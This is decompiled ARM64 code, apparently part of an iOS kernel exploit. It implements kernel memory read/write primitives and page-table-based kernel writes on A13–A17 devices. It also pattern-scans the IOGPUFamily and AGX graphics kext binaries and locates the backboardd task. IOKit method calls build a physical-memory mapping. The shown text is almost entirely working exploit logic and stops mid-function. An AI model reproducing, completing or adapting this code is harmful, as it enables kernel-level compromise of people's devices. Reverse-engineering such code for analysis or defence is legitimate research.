//----- (0000000000015CA4) ----------------------------------------------------
__int64 test_appsepmanager_presence()
{
  ioservice_get_matching("xyz");
  return 0;
}

//----- (0000000000015CC8) ----------------------------------------------------
void __fastcall necp_send_msg_2(struct_krwCtx *krwCtx)
{
  void *v1; // x19

  v1 = (void *)krwCtx->dmaFailCtx;
  if ( v1 )
  {
    krwCtx->dmaFailCtx = 0;
    bzero(v1, 0x520u);
    free(v1);
  }
}
// 15D00: variable 'vars8' is possibly undefined

//----- (0000000000015D1C) ----------------------------------------------------
__int64 __fastcall pgtable_locked_kwrite32_retry(struct_krwCtx *krwCtx, __int64 a2, int a3)
{
  __int64 v5; // x22
  __int64 v6; // x21
  __int64 v7; // x23
  int v8; // w0
  __int64 v9; // x25
  __int64 v10; // x8
  __int64 v11; // x21
  __int64 v12; // x22
  int v13; // w8
  int v14; // w26
  int v16; // [xsp+Ch] [xbp-74h] BYREF
  uint8_t v17[4]; // [xsp+10h] [xbp-70h] BYREF
  int v18; // [xsp+14h] [xbp-6Ch] BYREF
  uint64_t v19[4]; // [xsp+18h] [xbp-68h] BYREF
  __int64 v20; // [xsp+38h] [xbp-48h]

  v18 = a3;
  v20 = 0;
  v5 = KRWCTX_FIELD_U64(krwCtx, 7512);
  v6 = krwCtx->pageMask;
  if ( !(unsigned int)acquire_write_semaphore_lock(krwCtx, 8u, 0x3A98u) )
  {
    if ( !v5 )
    {
      v7 = krw_physmap_ctx_init(krwCtx);
      if ( (uint32_t)v7 )
        goto LABEL_19;
      v5 = KRWCTX_FIELD_U64(krwCtx, 7512);
    }
    if ( (unsigned int)krw_read_thunk(krwCtx, a2, 4, v17) )
    {
      v8 = pgtable_walk_wrapper(krwCtx, a2 & ~krwCtx->pageMask, v19);
      v7 = 0xFFFFFFFFLL;
      if ( !v8 )
        goto LABEL_19;
      v9 = v20 & 0xFFFFFFFFC000LL;
      if ( (v20 & 0xFFFFFFFFC000LL) == 0 )
        goto LABEL_19;
      v10 = v6 & a2;
      v11 = *(uint64_t *)(v5 + 1296);
      v12 = *(uint64_t *)(v5 + 1304) + v10;
      v13 = 99;
      while ( 1 )
      {
        v14 = v13;
        if ( !(unsigned int)krw_read_thunk(krwCtx, v11, 8, v19) )
          break;
        v19[0] = (v19[0] & 0xFFFF000000003FFFLL) | v9;
        v7 = 163856;
        if ( !(unsigned int)kwrite_with_retry(krwCtx, v11, (__int64)v19, 8) )
          goto LABEL_19;
        semaphore_timedwait_ns(krwCtx, 0x2710u);
        if ( !(unsigned int)kwrite_with_retry(krwCtx, v12, (__int64)&v18, 4) )
          goto LABEL_19;
        if ( !(unsigned int)krw_read_thunk(krwCtx, a2, 4, &v16) )
          break;
        if ( v16 != v18 )
        {
          v13 = v14 - 1;
          if ( v14 )
            continue;
        }
        if ( v16 == v18 )
          v7 = 0;
        else
          v7 = 0xFFFFFFFFLL;
        goto LABEL_19;
      }
    }
    v7 = 163855;
LABEL_19:
    release_write_semaphore_lock(krwCtx, 8u);
    return v7;
  }
  return 708642;
}
// 15DA8: variable 'v8' is possibly undefined

//----- (0000000000015EC4) ----------------------------------------------------
__int64 __fastcall krw_physmap_ctx_init(struct_krwCtx *krwCtx)
{
  __int64 v1; // x23
  unsigned int *v3; // x0
  unsigned int *v4; // x20
  __int64 v5; // x8
  __int64 v6; // x1
  __int64 v7; // x26
  void *v8; // x0
  __int64 v9; // x21
  struct_a1 *v10; // x22
  __int128 v11; // q0
  __int128 v12; // q1
  __int64 v13; // x8
  int v14; // w9
  int v15; // w10
  char *v16; // x0
  char *v17; // x0
  char *v18; // x23
  __int64 v19; // x25
  int v21; // w24
  char *v22; // x0
  char *v23; // x23
  char *v24; // x0
  char *v25; // x23
  __int64 v26; // x25
  int v27; // w27
  __int64 v28; // x23
  unsigned __int64 v29; // x0
  __int64 v30; // x0
  __int64 v31; // x25
  __int64 v32; // x0
  __int64 v33; // x0
  __int64 v34; // x21
  int v35; // w27
  int v36; // w8
  unsigned __int64 v37; // x0
  unsigned __int64 v38; // x22
  int has_flag; // w0
  unsigned __int64 v40; // x1
  unsigned __int64 v41; // x22
  __int64 v42; // x21
  int v43; // w0
  __int64 v44; // x8
  __int64 v45; // x21
  unsigned __int64 v46; // x0
  __int64 v47; // x24
  __int64 *v48; // x8
  __int64 v49; // t1
  __int64 v50; // x9
  __int64 v51; // x10
  __int64 v52; // x22
  vm_size_t v53; // x21
  vm_size_t v54; // x25
  kern_return_t v55; // w0
  __int64 v56; // x23
  __int64 v57; // x27
  __int64 v58; // x0
  vm_size_t v59; // x2
  __int64 v60; // x8
  __int64 v61; // x22
  __int64 v62; // x10
  __int64 v63; // x11
  __int64 v64; // x1
  __int64 v65; // x10
  unsigned __int8 *v66; // x9
  unsigned __int8 *v67; // x10
  unsigned int v68; // t1
  unsigned int v69; // t1
  unsigned __int64 v70; // x0
  unsigned __int64 v71; // x0
  char *v72; // x0
  char *v73; // x0
  unsigned int v74; // w8
  unsigned __int64 v75; // x9
  __int64 v76; // x11
  char v77; // w9
  uint64_t *v78; // x8
  __int64 v79; // x9
  char *v80; // x21
  unsigned __int64 v81; // x22
  __int64 v82; // x9
  mach_port_t v83; // w21
  uint64_t v84; // x8
  mach_port_t v85; // w0
  mach_port_t v86; // w0
  int v87; // w0
  unsigned __int64 v88; // x21
  int v89; // w0
  unsigned __int64 v90; // x22
  __int64 v91; // x28
  __int64 v92; // x23
  char *v93; // x0
  int v94; // t1
  char *v95; // x0
  char *v96; // x23
  __int64 v97; // x25
  void *v98; // x0
  void *v99; // x25
  int v100; // w0
  unsigned __int64 v101; // x21
  unsigned __int64 v102; // x28
  unsigned __int64 v103; // x22
  unsigned __int64 v104; // x0
  size_t v105; // x23
  unsigned __int64 v106; // x8
  unsigned __int64 v107; // x21
  char *v108; // x0
  char *v109; // x0
  __int64 v110; // x0
  char *v111; // x0
  char *v112; // x0
  char *v113; // x23
  __int64 v114; // x24
  __int64 v115; // x9
  int v116; // w11
  __int64 v117; // x9
  unsigned __int64 v118; // x21
  uint64_t *v119; // x23
  char *v120; // x0
  __int64 v121; // x8
  __int64 v122; // x10
  char *v123; // x25
  char *v124; // x0
  unsigned int v125; // t1
  unsigned __int64 v126; // x11
  unsigned __int64 v127; // x12
  unsigned __int64 v128; // x9
  unsigned __int64 v129; // x22
  char *v130; // x0
  uint64_t *v131; // x10
  char *v132; // x9
  __int64 v133; // x8
  char *v134; // x10
  int v135; // t1
  unsigned __int64 v136; // x0
  char *v137; // x0
  char *v138; // x8
  char *v139; // x0
  unsigned __int64 v140; // x10
  __int64 v141; // x8
  __int64 v142; // x21
  __int64 v143; // x23
  __int64 v144; // x9
  char *v145; // x8
  __int64 v146; // x10
  unsigned int v147; // w12
  char *v148; // x0
  unsigned int v149; // t1
  unsigned __int64 v150; // x11
  unsigned __int64 v151; // x10
  char *v152; // x0
  __int64 v153; // x21
  char *v154; // x0
  char *v155; // x0
  char *v156; // x0
  char *v157; // x0
  char *v158; // x22
  unsigned __int64 *v159; // x25
  unsigned __int64 v160; // x9
  unsigned __int64 v161; // x9
  unsigned __int64 v162; // x1
  char *v163; // x8
  char *v164; // x0
  __int64 v165; // x8
  __int64 v166; // x21
  __int64 v167; // x22
  char *v168; // x0
  char *v169; // x0
  unsigned int v170; // t1
  unsigned __int64 v171; // x9
  unsigned __int64 v172; // x10
  unsigned __int64 v173; // x8
  __int64 v174; // x8
  int v175; // w0
  unsigned __int64 v176; // x8
  int32x2_t v177; // d0
  int64x2_t v178; // off
  uint64_t *v179; // x28
  __int64 v180; // x0
  __int64 v181; // x21
  __int64 v182; // x25
  int v183; // w0
  vm_address_t v184; // x27
  __int64 v185; // x0
  __int64 v186; // x22
  int v187; // w0
  vm_address_t v188; // x23
  int v189; // w0
  int v190; // w0
  int v191; // w0
  int v192; // w0
  int v193; // w0
  unsigned __int64 v194; // x8
  __int64 v195; // x0
  __int64 v196; // x26
  int v197; // w0
  int v198; // w0
  uint64_t v199; // x9
  __int64 v200; // x8
  vm_address_t v201; // x9
  __int64 v202; // x27
  __int64 v203; // x26
  unsigned __int64 v204; // x21
  uint64_t *v205; // x28
  __int64 v206; // x1
  __int64 v207; // x25
  unsigned __int64 v208; // x0
  unsigned __int64 v209; // x0
  unsigned __int64 v210; // x22
  int v211; // w0
  __int64 v212; // x23
  int v213; // w0
  __int64 i; // x23
  __int64 v215; // x28
  __int64 v216; // x0
  __int64 v217; // x22
  __int64 v218; // x23
  int v219; // w0
  bool v220; // zf
  __int64 v221; // x25
  __int64 v222; // x9
  __int64 v223; // x9
  __int64 v224; // x9
  unsigned __int64 v225; // x25
  unsigned __int64 v226; // x10
  vm_address_t v227; // x8
  int64x2_t v228; // q0
  __int64 v229; // x21
  __int64 *v230; // x22
  __int64 v231; // t1
  int v232; // w0
  __int64 v233; // x22
  uint64_t *v234; // x27
  __int64 v235; // x28
  __int64 v236; // x21
  __int64 v237; // x26
  int v238; // w25
  vm_address_t v239; // x11
  char *v240; // x12
  char *v241; // x23
  unsigned __int64 v242; // x8
  unsigned __int64 v243; // x9
  __int64 v244; // x10
  __int64 v245; // x13
  char *v246; // x12
  __int64 v247; // x12
  __int64 v248; // x12
  uint64_t *v249; // x11
  __int64 v250; // x11
  __int64 v251; // x25
  __int64 v252; // x9
  char *v253; // x10
  char *v254; // x23
  unsigned __int64 v255; // x21
  __int64 v256; // x8
  char *v257; // x10
  __int64 v258; // x10
  __int64 v259; // x10
  __int64 v260; // x10
  uint64_t *v261; // x9
  __int64 v262; // x9
  __int64 v263; // x9
  __int64 v264; // x9
  __int64 v265; // x9
  __int64 v266; // x26
  uint64_t *v267; // x9
  unsigned __int64 v268; // x21
  uint64_t *v269; // x12
  __int64 v270; // x10
  __int64 v271; // x10
  __int64 v272; // x10
  __int64 v273; // x10
  __int64 v274; // x10
  __int64 v275; // x10
  __int64 v276; // x10
  __int64 v277; // x10
  __int64 v278; // x10
  unsigned __int64 v279; // x21
  char v280; // w21
  __int64 v281; // x22
  __int64 v282; // x0
  __int64 v283; // x21
  int v284; // [xsp+20h] [xbp-6F0h]
  vm_address_t v285; // [xsp+28h] [xbp-6E8h]
  unsigned __int64 v286; // [xsp+30h] [xbp-6E0h]
  vm_address_t v287; // [xsp+40h] [xbp-6D0h]
  vm_address_t v288; // [xsp+48h] [xbp-6C8h]
  __int64 v289; // [xsp+48h] [xbp-6C8h]
  unsigned __int64 v290; // [xsp+50h] [xbp-6C0h]
  __int64 v291; // [xsp+50h] [xbp-6C0h]
  unsigned __int64 v292; // [xsp+50h] [xbp-6C0h]
  int v293[2]; // [xsp+50h] [xbp-6C0h]
  uint64_t *v294; // [xsp+50h] [xbp-6C0h]
  int v295[2]; // [xsp+58h] [xbp-6B8h]
  __int64 v296; // [xsp+58h] [xbp-6B8h]
  int v297[2]; // [xsp+58h] [xbp-6B8h]
  unsigned __int64 v298; // [xsp+58h] [xbp-6B8h]
  int v299[2]; // [xsp+58h] [xbp-6B8h]
  __int64 v300; // [xsp+60h] [xbp-6B0h]
  __int64 v301; // [xsp+60h] [xbp-6B0h]
  __int64 *v302; // [xsp+60h] [xbp-6B0h]
  __int64 v303; // [xsp+60h] [xbp-6B0h]
  unsigned __int64 v304; // [xsp+70h] [xbp-6A0h] BYREF
  unsigned __int64 v305; // [xsp+78h] [xbp-698h] BYREF
  unsigned __int64 v306; // [xsp+80h] [xbp-690h] BYREF
  unsigned __int64 v307; // [xsp+88h] [xbp-688h] BYREF
  unsigned __int64 v308; // [xsp+90h] [xbp-680h] BYREF
  unsigned __int64 v309; // [xsp+98h] [xbp-678h] BYREF
  unsigned __int64 v310; // [xsp+A0h] [xbp-670h] BYREF
  unsigned __int64 v311; // [xsp+A8h] [xbp-668h] BYREF
  size_t v312; // [xsp+B0h] [xbp-660h] BYREF
  size_t v313; // [xsp+B8h] [xbp-658h] BYREF
  vm_address_t target_address[3]; // [xsp+C0h] [xbp-650h] BYREF
  size_t outputStructCnt; // [xsp+D8h] [xbp-638h] BYREF
  uint8_t v316[24]; // [xsp+E0h] [xbp-630h] BYREF
  __int64 v317; // [xsp+F8h] [xbp-618h]
  uint8_t v318[12]; // [xsp+100h] [xbp-610h] BYREF
  unsigned int v319; // [xsp+10Ch] [xbp-604h]
  uint64_t size[2]; // [xsp+110h] [xbp-600h] BYREF
  uint64_t input[2]; // [xsp+120h] [xbp-5F0h] BYREF
  __int64 outputStruct; // [xsp+130h] [xbp-5E0h] BYREF
  unsigned int v323; // [xsp+138h] [xbp-5D8h]
  vm_address_t address[2]; // [xsp+140h] [xbp-5D0h] BYREF
  uint8_t inputStruct[24]; // [xsp+150h] [xbp-5C0h] BYREF
  __int128 v326; // [xsp+168h] [xbp-5A8h]
  __int128 v327; // [xsp+178h] [xbp-598h]
  __int128 v328; // [xsp+188h] [xbp-588h]
  __int128 v329; // [xsp+198h] [xbp-578h]
  __int128 v330; // [xsp+1A8h] [xbp-568h]
  __int128 v331; // [xsp+1B8h] [xbp-558h]
  __int128 v332; // [xsp+1C8h] [xbp-548h]
  __int128 v333; // [xsp+1D8h] [xbp-538h]
  __int128 v334; // [xsp+1E8h] [xbp-528h]
  __int128 v335; // [xsp+1F8h] [xbp-518h]
  __int128 v336; // [xsp+208h] [xbp-508h]
  __int128 v337; // [xsp+218h] [xbp-4F8h]
  __int128 v338; // [xsp+228h] [xbp-4E8h]
  uint8_t v339[32]; // [xsp+238h] [xbp-4D8h]
  __int64 v340; // [xsp+258h] [xbp-4B8h]
  __int64 v341; // [xsp+260h] [xbp-4B0h]
  vm_address_t src_address[36]; // [xsp+560h] [xbp-1B0h] BYREF
  __int128 v343; // [xsp+680h] [xbp-90h] BYREF
  uint64_t v344[2]; // [xsp+690h] [xbp-80h]
  __int64 v345; // [xsp+6A0h] [xbp-70h]

  v1 = 708616;
  if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8796, 142, 1, 700, 13) || !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A13_A14_A15_A16_A17_MASK) )
    return v1;
  if ( krwCtx->dmaFailCtx )
    return 0;
  v3 = (unsigned int *)calloc(1u, 0x520u);
  if ( !v3 )
    return 708617;
  v4 = v3;
  krwCtx->dmaFailCtx = v3;
  v5 = krwCtx->mappedKernelRegion_size8byte;
  if ( v5 )
  {
    if ( krwCtx->mappedKernelSize_size8byte )
    {
      v6 = *(uint64_t *)(v5 + 352);
      if ( v6 )
      {
        if ( (unsigned int)krw_read_thunk(krwCtx, v6, 552, v3 + 190) )
          return 0;
      }
    }
  }
  v7 = 163867;
  target_address[0] = 0;
  if ( !(unsigned int)get_kext_base_addr(krwCtx, "com.apple.iokit.IOGPUFamily", address)
    || !(unsigned int)find_macho_entry_by_name_wrap(krwCtx, "com.apple.AGXG", 0xEu, target_address) )
  {
    goto LABEL_26;
  }
  v8 = calloc(1u, 0x128u);
  if ( !v8 )
  {
    v7 = 708617;
    goto LABEL_26;
  }
  v9 = (__int64)v8;
  v10 = (struct_a1 *)calloc(1u, 0x128u);
  if ( v10 )
  {
    krw_ctx_zero_fields((struct_a1 *)v9, krwCtx);
    krw_ctx_zero_fields(v10, krwCtx);
    v11 = *(__int128 *)&krwCtx->xnuMajorVersion;
    v12 = *(__int128 *)&krwCtx->gap_0x150;
    *(__int128 *)(v9 + 112) = v11;
    *(__int128 *)(v9 + 128) = v12;
    v13 = krwCtx->gap_0x160_size8;
    *(uint64_t *)(v9 + 144) = v13;
    v14 = krwCtx->vmMapSize_size4;
    *(uint32_t *)(v9 + 152) = v14;
    v15 = krwCtx->pageSizeOrSomething;
    *(uint32_t *)(v9 + 56) = v15;
    v10->xnuMajorVersion = v11;
    v10->oword80 = v12;
    *(uint64_t *)&v10->oword90 = v13;
    DWORD2(v10->oword90) = v14;
    DWORD2(v10->oword30) = v15;
    v1 = 163863;
    if ( iosurface_physmap_setup_bool(v9, krwCtx->targetVmPort, address[0], 0)
      && iosurface_physmap_setup_bool((__int64)v10, krwCtx->targetVmPort, target_address[0], 0) )
    {
      v343 = xmmword_42FA0;
      *(__int128 *)v316 = xmmword_42FB0;
      macho_find_text_section(v9, inputStruct);
      v16 = find_pattern_macho_binary((__int64 *)inputStruct, &v343, v316, 4u);
      if ( v16 )
      {
        if ( (unsigned int)krw_read_thunk(krwCtx, (__int64)(v16 + 8), 4, src_address) )
        {
          v4[42] = ((LODWORD(src_address[0]) >> 10) & 0xFFF) << (LODWORD(src_address[0]) >> 30);
          LODWORD(src_address[0]) = -218763232;
          LODWORD(v343) = -32;
          macho_find_text_section(v9, inputStruct);
          v17 = find_pattern_macho_binary((__int64 *)inputStruct, src_address, &v343, 1u);
          if ( v17 )
          {
            v18 = v17;
            v19 = 0;
            while ( (unsigned int)krw_read_thunk(krwCtx, (__int64)&v18[v19], 4, v316) )
            {
              if ( (*(uint32_t *)v316 & 0xFFC0001F) == 0xF900001F )
              {
                v4[43] = ((*(uint32_t *)v316 >> 10) & 0xFFF) << (*(uint32_t *)v316 >> 30);
                v343 = xmmword_42FC0;
                LODWORD(v344[0]) = 872415232;
                *(__int128 *)v316 = xmmword_42FD0;
                *(uint32_t *)&v316[16] = -16777216;
                macho_find_text_section((__int64)v10, inputStruct);
                v22 = find_pattern_macho_binary((__int64 *)inputStruct, &v343, v316, 5u);
                if ( v22 )
                {
                  v23 = v22;
                  if ( (unsigned int)krw_read_thunk(krwCtx, (__int64)v22, 4, src_address) )
                  {
                    v4[46] = ((LODWORD(src_address[0]) >> 10) & 0xFFF) << (LODWORD(src_address[0]) >> 30);
                    if ( (unsigned int)krw_read_thunk(krwCtx, (__int64)(v23 + 8), 4, src_address) )
                    {
                      v4[44] = ((LODWORD(src_address[0]) >> 10) & 0xFFF) << (LODWORD(src_address[0]) >> 30);
                      if ( (unsigned int)krw_read_thunk(krwCtx, (__int64)(v23 + 12), 4, src_address) )
                      {
                        v4[45] = ((LODWORD(src_address[0]) >> 10) & 0xFFF) << (LODWORD(src_address[0]) >> 30);
                        *(__int128 *)inputStruct = xmmword_42FE0;
                        *(uint64_t *)&inputStruct[16] = 0x8B00000052800008LL;
                        v343 = xmmword_42FF0;
                        v344[0] = 0xFFE0FC00FFE0001FLL;
                        macho_find_text_section((__int64)v10, src_address);
                        v24 = find_pattern_macho_binary((__int64 *)src_address, inputStruct, &v343, 6u);
                        if ( v24 )
                        {
                          v25 = v24;
                          if ( (unsigned int)krw_read_thunk(krwCtx, (__int64)v24, 4, v316) )
                          {
                            v26 = 0;
                            v27 = 0;
                            v4[49] = (unsigned __int16)(*(uint32_t *)v316 >> 5);
                            while ( (unsigned int)krw_read_thunk(krwCtx, (__int64)&v25[v26 + 4], 4, v316) )
                            {
                              if ( (*(uint32_t *)v316 & 0xFFE0001F) == 0x52800008 )
                              {
                                if ( v27 == 1 )
                                {
                                  if ( (unsigned int)krw_read_thunk(
                                                       krwCtx,
                                                       (__int64)&v25[v26 + 4],
                                                       4,
                                                       v316) )
                                  {
                                    v91 = 0;
                                    v4[47] = (unsigned __int16)(*(uint32_t *)v316 >> 5);
                                    while ( (unsigned int)krw_read_thunk(
                                                            krwCtx,
                                                            (__int64)&v25[v26 + 4 + v91],
                                                            4,
                                                            v316) )
                                    {
                                      if ( *(uint32_t *)v316 == -219794127 )
                                      {
                                        if ( (unsigned int)krw_read_thunk(
                                                             krwCtx,
                                                             (__int64)&v25[v26 + 12 + v91],
                                                             4,
                                                             v316) )
                                        {
                                          v4[48] = ((*(uint32_t *)v316 >> 10) & 0xFFF) << (*(uint32_t *)v316 >> 30);
                                          *(__int128 *)inputStruct = xmmword_43000;
                                          *(uint64_t *)&inputStruct[16] = 0;
                                          LODWORD(v326) = 335544320;
                                          *(__int128 *)src_address = xmmword_43010;
                                          src_address[2] = 0;
                                          LODWORD(src_address[3]) = -67108864;
                                          macho_find_text_section(v9, &v343);
                                          v95 = find_pattern_macho_binary((__int64 *)&v343, inputStruct, src_address, 7u);
                                          if ( v95 )
                                          {
                                            v96 = v95;
                                            v97 = 0;
                                            while ( (unsigned int)krw_read_thunk(
                                                                    krwCtx,
                                                                    (__int64)&v96[v97],
                                                                    4,
                                                                    v316) )
                                            {
                                              if ( *(uint32_t *)v316 >> 26 == 37 )
                                              {
                                                if ( (unsigned int)krw_read_thunk(
                                                                     krwCtx,
                                                                     (__int64)&v96[v97 - 8],
                                                                     4,
                                                                     v316) )
                                                {
                                                  v4[50] = ((*(uint32_t *)v316 >> 10) & 0xFFF) << (*(uint32_t *)v316 >> 30);
                                                  v343 = xmmword_43020;
                                                  LODWORD(v344[0]) = -117440512;
                                                  *(__int128 *)v316 = xmmword_43030;
                                                  *(uint32_t *)&v316[16] = -4194273;
                                                  macho_find_text_section(v9, inputStruct);
                                                  v108 = find_pattern_macho_binary((__int64 *)inputStruct, &v343, v316, 5u);
                                                  if ( v108 )
                                                  {
                                                    if ( (unsigned int)krw_read_thunk(
                                                                         krwCtx,
                                                                         (__int64)v108,
                                                                         4,
                                                                         src_address) )
                                                    {
                                                      v4[51] = ((LODWORD(src_address[0]) >> 10) & 0xFFF) << (LODWORD(src_address[0]) >> 30);
                                                      *(uint64_t *)&v343 = 0x2900000011000000LL;
                                                      *(uint64_t *)v316 = 0x3F0000003FLL;
                                                      macho_find_text_section(v9, inputStruct);
                                                      v109 = find_pattern_macho_binary((__int64 *)inputStruct, &v343, v316, 2u);
                                                      if ( v109 )
                                                      {
                                                        if ( (unsigned int)krw_read_thunk(
                                                                             krwCtx,
                                                                             (__int64)(v109 + 12),
                                                                             4,
                                                                             src_address) )
                                                        {
                                                          v4[52] = ((LODWORD(src_address[0]) >> 10) & 0xFFF) << (LODWORD(src_address[0]) >> 30);
                                                          v110 = (__int64)krwCtx->kernelMachoCtx;
                                                          *(uint64_t *)&v343 = 0x8B020108F9400008LL;
                                                          *(uint64_t *)v316 = -4193281;
                                                          macho_find_text_section(v110, inputStruct);
                                                          v111 = find_pattern_macho_binary((__int64 *)inputStruct, &v343, v316, 2u);
                                                          if ( v111 )
                                                          {
                                                            if ( (unsigned int)krw_read_thunk(
                                                                                 krwCtx,
                                                                                 (__int64)v111,
                                                                                 4,
                                                                                 src_address) )
                                                            {
                                                              v4[53] = ((LODWORD(src_address[0]) >> 10) & 0xFFF) << (LODWORD(src_address[0]) >> 30);
                                                              v343 = xmmword_43040;
                                                              *(uint64_t *)v316 = -1;
                                                              *(uint64_t *)&v316[8] = -1;
                                                              macho_find_text_section((__int64)v10, inputStruct);
                                                              v112 = find_pattern_macho_binary((__int64 *)inputStruct, &v343, v316, 4u);
                                                              if ( v112 )
                                                              {
                                                                v113 = v112;
                                                                v114 = 0;
                                                                while ( (unsigned int)krw_read_thunk(
                                                                                        krwCtx,
                                                                                        (__int64)&v113[v114],
                                                                                        4,
                                                                                        src_address) )
                                                                {
                                                                  if ( (src_address[0] & 0x1F000000) == 0x10000000 )
                                                                  {
                                                                    v136 = find_kernel_func(
                                                                             (__int64 *)v10,
                                                                             (__int64 *)&v113[v114]);
                                                                    v1 = 0;
                                                                    *((uint64_t *)v4 + 27) = v136;
                                                                    v21 = 1;
                                                                    goto LABEL_44;
                                                                  }
                                                                  v114 -= 4;
                                                                  if ( (uint32_t)v114 == -116 )
                                                                    goto LABEL_43;
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                                goto LABEL_43;
                                              }
                                              v97 += 4;
                                              if ( (uint32_t)v97 == 276 )
                                                goto LABEL_43;
                                            }
                                          }
                                        }
                                        goto LABEL_43;
                                      }
                                      v91 += 4;
                                      if ( (uint32_t)v91 == 196 )
                                        goto LABEL_43;
                                    }
                                  }
                                  goto LABEL_43;
                                }
                                v27 = 1;
                              }
                              v26 += 4;
                              if ( (uint32_t)v26 == 196 )
                                goto LABEL_43;
                            }
                          }
                        }
                      }
                    }
                  }
                }
                break;
              }
              v19 += 4;
              if ( (uint32_t)v19 == 76 )
                break;
            }
          }
        }
      }
LABEL_43:
      v21 = 0;
      v1 = 163867;
    }
    else
    {
      v21 = 0;
    }
  }
  else
  {
    v21 = 0;
    v1 = 708617;
  }
LABEL_44:
  free_kernel_image_resources(v9);
  free((void *)v9);
  if ( v10 )
  {
    free_kernel_image_resources((__int64)v10);
    free(v10);
  }
  if ( !v21 )
    goto LABEL_27;
  v28 = krwCtx->dmaFailCtx;
  outputStructCnt = 16;
  v312 = 16;
  v313 = 16;
      v29 = lookup_or_resolve_kaddr(krwCtx);
  if ( v29 )
  {
    v30 = krw_task_for_name(krwCtx, v29, "backboardd");
    if ( v30 )
    {
      v31 = krwCtx->dmaFailCtx;
      v32 = kreadptr(krwCtx, v30);
      if ( v32 )
      {
        v33 = read_pte_entry_chain(krwCtx, v32, v316, address);
        if ( v33 )
        {
          if ( *(uint32_t *)v316 )
          {
            v34 = v33;
            v35 = 0;
            while ( kread_physmap_decorated(
                      krwCtx,
                      v34 + (unsigned int)(LODWORD(address[0]) * v35),
                      (unsigned __int64 *)inputStruct) )
            {
              if ( *(uint64_t *)inputStruct )
              {
                if ( !kread_u32(krwCtx, *(unsigned __int64 *)inputStruct, target_address) )
                  break;
                if ( (target_address[0] & 0x80000000) != 0 )
                {
                  v36 = target_address[0] & 0x3FF;
                  if ( (target_address[0] & 0x3FF) != 0 )
                  {
                    LODWORD(target_address[0]) = target_address[0] & 0x3FF;
                    if ( v36 == 29 )
                    {
                      v37 = maybe_ipc_port_get_kobject(krwCtx, *(unsigned __int64 *)inputStruct);
                      if ( !v37 )
                        break;
                      v38 = v37;
                      if ( !kread_physmap_decorated(krwCtx, v37, src_address) )
                        break;
                      if ( src_address[0] == *(uint64_t *)(v31 + 216) + 16LL )
                      {
                        if ( (unsigned int)plist_elem_is_string_6(
                                             krwCtx,
                                             *(unsigned __int64 *)inputStruct,
                                             (mach_port_name_t *)&v343) )
                          break;
                        v83 = v343;
                        *(uint64_t *)(v31 + 224) = v38;
                        v4[2] = v83;
                        if ( v83 )
                        {
                          bzero(inputStruct, 0x408u);
                          if ( !IOConnectCallStructMethod(v83, 7u, inputStruct, 0x408u, address, &outputStructCnt) )
                          {
                            v4[3] = address[0];
                            *((uint8_t *)v4 + 16) = 1;
                            *(__int128 *)target_address = xmmword_43050;
                            if ( !IOConnectCallMethod(v4[2], 0xFu, target_address, 2u, 0, 0, 0, 0, &outputStruct, &v313) )
                            {
                              v84 = v323;
                              v4[5] = v323;
                              *((uint8_t *)v4 + 24) = 1;
                              v85 = v4[2];
                              input[0] = v4[3];
                              input[1] = v84;
                              if ( !IOConnectCallScalarMethod(v85, 0x19u, input, 2u, 0, 0) )
                              {
                                size[0] = krwCtx->pageSizeOrSomething;
                                size[1] = 0;
                                if ( !IOConnectCallMethod(v4[2], 0xDu, size, 2u, 0, 0, 0, 0, v318, &v312) )
                                {
                                  v4[7] = v319;
                                  *((uint8_t *)v4 + 36) = 1;
                                  size[0] = krwCtx->pageSizeOrSomething;
                                  if ( !IOConnectCallMethod(v4[2], 0xDu, size, 2u, 0, 0, 0, 0, v318, &v312) )
                                  {
                                    v4[8] = v319;
                                    *((uint8_t *)v4 + 37) = 1;
                                    if ( kread_physmap_decorated(
                                           krwCtx,
                                           *(uint64_t *)(v28 + 224) + *(unsigned int *)(v28 + 168),
                                           (unsigned __int64 *)(v28 + 232))
                                      && kread_physmap_decorated(
                                           krwCtx,
                                           *(uint64_t *)(v28 + 232) + *(unsigned int *)(v28 + 176),
                                           (unsigned __int64 *)(v28 + 240)) )
                                    {
                                      v86 = v4[2];
                                      *(uint64_t *)v316 = v4[3];
                                      v317 = 56;
                                      *(__int128 *)&v316[8] = xmmword_43750;
                                      memset(&src_address[1], 0, 48);
                                      LODWORD(src_address[0]) = v4[7];
                                      HIDWORD(src_address[0]) = src_address[0];
                                      if ( !IOConnectCallMethod(
                                              v86,
                                              0x1Au,
                                              (const uint64_t *)v316,
                                              4u,
                                              src_address,
                                              0x38u,
                                              0,
                                              0,
                                              0,
                                              0) )
                                      {
                                        HIDWORD(src_address[0]) = v4[8];
                                        if ( !IOConnectCallMethod(
                                                v4[2],
                                                0x1Au,
                                                (const uint64_t *)v316,
                                                4u,
                                                src_address,
                                                0x38u,
                                                0,
                                                0,
                                                0,
                                                0)
                                          && kread_physmap_decorated(
                                               krwCtx,
                                               *(uint64_t *)(v28 + 232) + *(unsigned int *)(v28 + 200),
                                               &v311)
                                          && kread_physmap_decorated(
                                               krwCtx,
                                               v311 + *(unsigned int *)(v28 + 204),
                                               &v310)
                                          && kread_physmap_decorated(krwCtx, v310 + 8 * v4[7], &v309)
                                          && kread_physmap_decorated(krwCtx, v310 + 8 * v4[8], &v308)
                                          && kread_physmap_decorated(
                                               krwCtx,
                                               v309 + *(unsigned int *)(v28 + 208),
                                               &v307)
                                          && kread_physmap_decorated(
                                               krwCtx,
                                               v308 + *(unsigned int *)(v28 + 208),
                                               &v306)
                                          && kread_physmap_decorated(
                                               krwCtx,
                                               v307 + *(unsigned int *)(v28 + 212),
                                               &v305)
                                          && kread_physmap_decorated(
                                               krwCtx,
                                               v306 + *(unsigned int *)(v28 + 212),
                                               &v304) )
                                        {
                                          v87 = pgtable_walk_wrapper(krwCtx, v305 & ~krwCtx->pageMask, &v343);
                                          if ( v87 )
                                          {
                                            v88 = v345 & 0xFFFFFFFFC000LL;
                                            if ( (v345 & 0xFFFFFFFFC000LL) != 0 )
                                            {
                                              v89 = pgtable_walk_wrapper(krwCtx, v304 & ~krwCtx->pageMask, &v343);
                                              if ( v89 )
                                              {
                                                v90 = v345 & 0xFFFFFFFFC000LL;
                                                if ( (v345 & 0xFFFFFFFFC000LL) != 0
                                                  && !(unsigned int)physmap_map_cached(
                                                                      krwCtx,
                                                                      v88,
                                                                      (__int64)(v4 + 10)) )
                                                {
